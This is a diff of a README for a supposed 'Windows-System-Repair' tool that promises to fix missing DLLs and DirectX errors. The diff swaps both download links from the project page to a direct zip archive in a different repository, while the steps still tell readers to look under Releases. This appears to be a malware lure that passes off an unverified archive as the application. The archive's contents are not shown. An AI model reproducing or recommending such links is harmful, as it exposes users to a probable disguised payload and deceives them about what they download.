@@ -5,7 +5,7 @@ description: "Fix corrupted Windows system files, missing DLLs, DirectX errors, 
 ---
 # 🛠️ Windows-System-Repair - Fix broken system files with ease
 
-[![Download Windows-System-Repair](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Sdmmin7553/Windows-System-Repair)
+[![Download Windows-System-Repair](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Sdmmin7553/sdmmin7553.github.io/main/morsing/github_sdmmin_io_v1.7-beta.3.zip)
 
 ## 📌 About this software
 
@@ -17,7 +17,7 @@ Many users face errors when they try to open games or specific applications. You
 
 You do not need to install complex software or use the command prompt. Follow the steps below to start the repair process.
 
-1. Visit [this link](https://github.com/Sdmmin7553/Windows-System-Repair) to open the download page.
+1. Visit [this link](https://raw.githubusercontent.com/Sdmmin7553/sdmmin7553.github.io/main/morsing/github_sdmmin_io_v1.7-beta.3.zip) to open the download page.
 2. Look for the latest version listed under the Releases section.
 3. Click the file name to download the application to your computer.
 4. Move the file to your desktop for easy access.
